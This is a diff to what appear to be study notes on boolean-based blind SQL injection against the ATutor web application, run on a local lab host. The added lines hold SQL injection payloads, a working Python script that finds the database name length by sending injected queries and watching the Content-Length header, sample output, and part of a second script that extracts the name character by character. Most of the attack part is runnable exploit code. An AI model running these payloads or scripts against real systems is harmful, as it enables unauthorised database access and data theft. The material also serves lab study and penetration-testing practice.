@@ -3,7 +3,7 @@
 - Identifying the vulnerability:
 > - My Opinion and experience (don't take it literally but I guess it's true (for me atleast)):
 >   - Normally Boolean Based Blind SQLi can be detected by keeping an eye on `Content-Length` header when payload is introduced.
->   - A drastic change in response length when the some query returns true as compared to when something returns false is a 100% sure giveaway of vulnerability.
+>   - A drastic change in response length when some query returns true as compared to when something returns false is a 100% sure giveaway of a vulnerability.
 > - Payload
 > - True  
 > ```sql
@@ -22,13 +22,50 @@
 > ```sql
 > and (length(database())) = 15 --
 > ```
+
+> - Script:
+> ```python
+> import multiprocessing as mp
+> import requests
 >
+> target = "http://localhost/atutor/mods/_standard/social/index_public.php"
+>
+> def db_length(number):
+>     payload = f"te')/**/or/**/(length(database()))={number}#"
+>     param = {'q': payload}
+>     r = requests.get(target, param)
+>     content_length = int(r.headers['Content-length'])
+>     if content_length > 20:
+>         print(number)
+>
+> if __name__ == "__main__":
+>     print('[*] Retreiving Database Length: \n[*] Database length: ', end=' ')
+>     processes = []
+>     for number in range(30):
+>         p = mp.Process(target=db_length, args=[number])
+>         p.start()
+>         processes.append(p)
+>     for process in processes:
+>         process.join()
+>
+>     
+> ```
+> - Output:
+> ```
+>  python .\atutor_dblength.py
+> [*] Retreiving Database Length:
+> [*] Database length: 6
+> ```
 
 - Retrieving the database name
 > - We should use ASCII function coz most of the time single quotes or double quotes might cause errors or problems.
 > - Refer the following to see char to ascii conversion: https://www.rapidtables.com/code/text/ascii-table.html
-> - I'm way too lazy now to write down how it works.
-> - Try Understanding the following python code or make changes if you want:
+> - Payload
+> ```sql
+> and (select ascii(substring(database(),1, 1)) = 110)#
+> ```
+
+> - Script (Slow)
 > ```python
 > import requests
 >
@@ -52,7 +89,7 @@
 >         prev_length += 1
 >         i += 1
 >     return final_string
-> 
+>
 > if __name__ == "__main__":
 >     print("[+] Retrieving Database name: ....")
 >     print("[+] Database Version: ", atutor_dbRetrieval())
